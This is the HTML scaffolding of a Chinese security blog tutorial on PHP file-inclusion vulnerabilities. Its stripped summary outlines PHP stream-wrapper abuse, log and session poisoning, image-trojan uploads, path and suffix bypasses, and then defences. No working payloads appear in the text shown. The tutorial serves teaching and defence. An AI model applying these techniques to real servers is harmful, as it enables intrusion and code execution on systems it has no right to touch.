<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>浅析文件包含 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="浅析文件包含"><meta name="application-name" content="浅析文件包含"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="浅析文件包含"><meta property="og:url" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="文件包含总结 0x01 文件包含的概念： 把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。 1.1 文件包含的原理： 文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="文件包含总结 0x01 文件包含的概念： 把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。 1.1 文件包含的原理： 文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '浅析文件包含',
  postAI: '',
  pageFillDescription: '文件包含总结, 0x01 文件包含的概念：, 1.1 文件包含的原理：, 1.2 文件包含分类：, 1.3 文件包含函数：, 0x02 PHP伪协议：, 2.1 php//input, 2.2 php//filter, 2.3 zip//, 2.4 data//与phar//, 2.5 expect//伪协议, 0x03 特殊文件包含, 3.1 包含Apache日志文件, 3.2 包含SSH log日志文件, 3.3 包含environ, 3.4 包含fd, 3.5 包含SESSION, 3.6 包含临时文件, 3.7 包含上传文件, 3.8 其他包含姿势, 0x04 绕过方法, 4.1 指定前缀绕过, 4.1.1 目录遍历, 4.1.2 编码绕过, 4.2 指定后缀绕过, 4.2.1 利用url, 4.2.2 利用协议, 4.2.3 长度截断, 4.2.4 %00截断, 4.2.5 点号截断, 4.2.6 双写绕过, 4.2.7 大小写混合绕过, 0x05 漏洞防护文件包含总结文件包含的概念把可重复使用的函数写入到单个文件中在使用该函数时直接调用此文件无需再次编写函数这一调用文件的过程被称为包含文件包含的原理文件包含漏洞产生的原因是在通过函数引入文件时由于传入的文件名没有经过合理的校验从而操作了预想之外的文件就可能导致意外的文件泄露甚至恶意的代码注入文件包含分类文件包含分为本地文件包含和远程文件包含而区分二者最简单的办法就是通过查看中是否开启了如果开启就有可能包含远程文件远程文件包含需要中在中默认一直是而从之后就默认为本地文件包含包含服务器上的资源能够打开并包含本地文件的漏洞我们称为本地文件包含漏洞远程文件包含通过协议包含其他地方的资源文件包含函数找不到被包含文件时会产生警告与类似代码已经被包含则不会再次包含找不到被包含的文件时会产生致命错误与类似代码已经被包含则不会再次包含思维导图伪协议提供了一些杂项输入输出流允许访问的输入输出流标准输入输出和错误描述符内存中磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器可以访问请求的原始数据的只读流将请求的数据当作代码执行当传入的参数作为文件名打开时可以将参数设为同时想设置的文件内容执行时会将内容当作文件内容从而导致任意代码执行注利用还可以写入木马即在中传入如下代码例子审计知当参数不为空且读取的文件中包含时即可显示所以可以使用得到原始的数据访问请求的原始数据的只读流将请求中的数据作为代码执行来进行绕过注遇到要想到用绕过可以获取指定文件源码当它与包含函数结合时流会被当作文件执行所以我们一般对其进行编码让其不执行从而导致任意文件读取前缀名称后加内容描述要过滤的数据流指定要过滤的数据流读链的筛选器列表参数可选可设定一个或者多个筛选器名称以管道符分隔写链的筛选器列表参数可选可设定一个或者多个筛选器名称以管道符分隔空两个链的筛选器列表没有用或者做前缀的筛选器列表会是轻快应用于读或者写为了读取包含有敏感信息的等源文件我们就要先将可能引发冲突的代码编码一遍这里就会用到读取文件源代码的时候需要用到编码器一般读取文件源代码然后再进行审计是语言中特有的协议流作用是作为一个中间流来处理其他流可以直接用不带任何过滤器的伪协议也可以用一些没有过滤掉的编码方式和转换方式怎么写入一句话木马退出程序这样即使插入了一句话木马在被使用的时候也无法被执行这样的死亡通常存在于缓存配置文件等等不允许用户直接访问的文件当中死亡绕过参考直接读取文件但大多数时候很多信息无法直接显示在浏览器页面上所以需要采取中方法将文件内容进行编码后显示在浏览器上再自行解码注更多用法可参考谈一谈的妙用尝试发现无法显示内容尝试得到一串字符解码得在源码中的注释里可以访问压缩包里面的文件当它与包含函数结合时流会被当作文件执行从而实现任意代码执行中只能传入绝对路径版本大于等于要用分隔压缩包和压缩包里的内容并且要用编码即下述中要用替换只需要是的压缩包即可后缀名可以任意更改相同的类型的还有和压缩包绝对路径压缩包内文件例子在当前目录的某个文件中文件名文件后缀文件大小存储在服务器的文件的临时副本的名称传参的时候利用上面的此时会成功绕过并且执行文件里的代码被当做代码执行与同样类似与可以让用户来控制输入流当它与包含函数结合时用户输入的流会被当作文件执行从而导致任意代码执行这是一个输入流执行的协议它可以向服务器输入数据而服务器也会执行利用条件版本大于等于若纯文字没用可用编码有点类似同样可以导致任意代码执行中相对路径和绝对路径都可以使用利用条件版本大于等于假设有个文件其内容为打包成压缩包如下指定绝对路径或者使用相对路径这里就在当前目录下伪协议伪协议用来执行系统命令但是需要安装拓展用法特殊文件包含服务器的中间件服务都有日志记录的功能如果开启了日志记录功能用户访问的日志就会存储到不同服务的相关文件如果日志文件的位置是默认位置或者是可以通过其他方法获取就可以通过访问日志将恶意代码写入到日志文件中去然后通过文件包含漏洞包含日志中的恶意代码获得权限典型的日志文件包含中间件日志文件包含日志文件包含中间件日志文件包含利用条件中间件日志文件的存储位置已知并且具有可读权限下面开始介绍日志文件包含漏洞利用步骤将恶意代码写入到日志文件中间件开启了访问日志记录功能会访问日志写入到日志文件中假设访问发现会在日志文件中有如下内容中间件日志访问会记录访问者的地址访问时间访问路径返回状态码等等利用中间件访问记录路径到日志文件中的功能将恶意代码写入到日志文件当中去添加恶意代码此时会提示但是不急查看日志文件发现已经将内容写入虽然已经写入到日志文件中去了但是浏览器进行了编码导致传入的代码不能正常使用可以通过抓包的方式写入恶意代码这样不会被浏览器进行编码查看日志文件内容如下恶意代码成功写入文件包含日志文件要执行文件包含必须要知道日志文件的位置常见的中间件日志文件都有默认的存储路径比如的中间件日志文件存在目录下文件名叫输入测试语句之后在向网页传入参数即可显示出的内容包含日志文件服务器一般会将用户的访问记录保存在访问日志中那么我们可以根据日志记录的内容精心构造请求把代码插入到日志文件中通过文件包含漏洞来执行日志中的代码利用条件对日志文件可读知道日志文件的存储目录注意一般情况下日至存储目录会被修改需要读取服务器配置文件或者根据中的信息来得知日志记录的信息都可以被调整比如记录报错的等级或者内容格式运行后一般默认会生成两个日志文件下是访问日志和错误日志下是和访问日志文件记录了客户端的每次请求和服务器响应的相关信息如果访问一个不存在的资源时如则会记录在日志中但是代码中的敏感字符会被浏览器转码我们可以通过绕过编码就可以把写入的日志文件然后可以通过包含日志文件来执行此代码但前提是你得知道日志文件的存储路径所以为了安全起见安装时尽量不要使用默认路径参考文章包含日志文件一道包含日志文件的题这里提供一道包含日志的题目包含日志文件利用条件需要知道的位置且可读默认情况下为下面介绍漏洞利用步骤将恶意代码写入文件如果开启了日志记录的功能那么会将的连接日志记录到日志文件当中将连接的用户名设置成恶意代码用命令连接受害者的服务器的服务查看日志文件可以观察到恶意代码已经写入到日志文件使用文件包含日志文件测试输入语句之后再向网页传入参数就可以出现的内容了参考包含利用条件以方式运行这样才会保持头文件存储位置已知且文件可读姿势中会保存头如果在中插入代码则代码会被写入到中之后再包含它即可可以参考这个包含与前面的方法类似可以将代码引入日志文件中这些代码可以通过易受攻击的脚本执行通常您会使用或将代码注入到这种方法有点棘手因为包含错误日志信息的文件在等下发生了变化我建议使用的暴力破解目录的目录结构可能的文件列表然后您可以监控返回的页面大小并进行调查参考包含可以先根据尝试包含到文件在根据文件内容寻找可控变量在构造插入到文件中最后包含即可利用条件找到内的可控变量文件可读写并且知道存储路径一般通过以下两种方式获取的存储位置通过的信息获取的存储位置通过的信息获取通过猜测默认的存储位置进行尝试通常中的的默认存储位置在目录下的文件的保存路径可以在的看到常见存储路径文件格式而在发送的请求的字段中可以看到参考文章一道包含的题示例分析文件包含代码如下此代码可以通过型的参数传入代码将会获取的值存入到中攻击者可以利用参数将恶意代码写入到文件中然后在利用文件包含漏洞包含此文件向系统中传递恶意代码漏洞分析上面的代码满足文件包含的两个要求代码将会获取变量的值存入到中的默认存储位置是访问会在目录下降传入的值存储到中的文件名以开头后跟可以通过开发者模式获取单击右键检查存储就可以找到内容假设通过开发者模式获取到的的值为所以的文件名为在目录下查看此文件内容为漏洞利用通过上面的分析可以得知向参数传入的内容会存储到文件中如果存在本地文件包含漏洞就可以通过写入恶意代码到文件当中去然后通过文件包含漏洞执行例如访问代码后会在目录下降的值写入文件文件的内容为攻击步骤将恶意代码写入文件攻击者可以通过或者猜测到存放的位置通过开发者模式可以获得文件名称通过本地文件包含漏洞可以解析文件达到攻击的目的比如包含临时文件中上传文件会创建临时文件在下使用目录而在下使用目录在临时文件被删除之前利用竞争即可包含该临时文件由于包含需要知道包含的文件名一种方法是进行暴力猜解下使用的随机函数有缺陷而下只有中不同的文件名所以这个方法是可行的另一种方法是配合页面的可以直接获取到上传文件的存储路径和临时文件名直接包含即可这个方法可以参考类似利用临时文件的存在竞争时间去包含的可以看看这道题夏令营包含上传文件很多网站通常会提供文件上传功能比如上传头像文档等这时就可以采取上传一句话图片木马的方式进行包含图片马的制作方式如下在控制台下输入进入和的文件目录后执行将图片和包含代码的文件合并生成图片马假设已经上传一句话图片木马到服务器路径为图片代码如下然后访问包含这张图片将会在所在的目录下生成其他包含姿势包含日志包含绕过方法指定前缀绕过目录遍历使用来返回上一目录被称为目录遍历例如测试代码如下前缀现在在目录下有文件则利用可以进行目录遍历比如我们尝试访问则服务器端实际拼接出来的路径为即从而包含成功编码绕过服务器端常常会对于等做一些过滤可以用一些编码来进行绕过利用编码二次编码容器服务器的编码方式注注中会把解析为最后转义为字符的点注那里的超链接是指定后缀绕过后缀绕过测试代码如下下述各后缀绕过方法均使用此代码后缀利用在远程文件包含漏洞中可以利用或来绕过后缀限制可参考此文章完整格式访问参数拼接后上述可能是截断号截断在路径后面输入号服务器会认为号后面的内容为方法传递的参数而被丢弃成功读取如下空格绕过这里也是一样需要使用编码进行绕过不能直接输入空格号绕过注这里需要对进行编码的编码为设在根目录下有文件访问参数拼接后设在根目录下有文件其他绕过方式一些常见的特殊字符编码这里可以用爆破一遍看哪个能用利用协议利用和由于整个压缩包都是我们的可控参数那么只需要知道他们的后缀便可以自己构建访问参数拼接后访问参数拼接后我的环境根目录中有压缩包内含其中包含代码所以分别构造为对应的结果分别为长度截断利用条件版本原理下目录最大长度为字节超出的部分会被丢弃下目录最大长度为字节超出的部分会被丢弃利用方法只需要不断的重复系统下也可以直接用截断省略指定的后缀的被丢弃成功包含木马文件则指定的后缀会在达到最大值后会被直接丢弃掉截断魔术引导介绍当句中含有单引号双引号反斜杠和时这时候如果不对这些符号进行转义写入数据库时就会出错而魔术引号就是对这些符号进行转义以便能把数据正确写入数据库不过该参数在文件中修改魔术引号特性已自起废弃并将自起移除也就是说在本实验环境的版本中仍是存在的在低版本中读取文件名时认为是终止符对于后面的内容就会失效利用条件版本利用方法直接在文件名的最后加上来截断指定的后缀名现阶段截断不常用点号截断原理系统点号长于超出的部分会被丢弃系统点号长于超出的部分会被丢弃示例抓包修改即可双写绕过当写入文件时发现删除某些特殊字符我们可以判断是删除了其中字符例如只需再增加一个使其删除后得到我们需要的需要注意绝对路径与相对路径大小写混合绕过如果在文件包含时服务器对我们传入的参数没有进行严格过滤比如没没有对大小写进行过滤我们可以使用大小写混合进行绕过漏洞防护使用等方法过滤掉危险字符配置防止目录遍历将所能打开的文件限制在指定的目录树中版本升级防止截断对上传的文件进行重命名防止被读取对于动态包含的文件可以设置一个白名单不读取非白名单的文件做好管理员权限划分做好文件的权限管理和最小权限化表示当前位置路径表示上一级路径位置在中同样适用一些常见的敏感信息路径系统查看系统版本配置文件存储系统初次安装的密码配置密码配置信息系统账户信息账户密码文件默认配置文件虚拟网站配置相关配置配置文件配置文件',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-22 16:03:55',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a 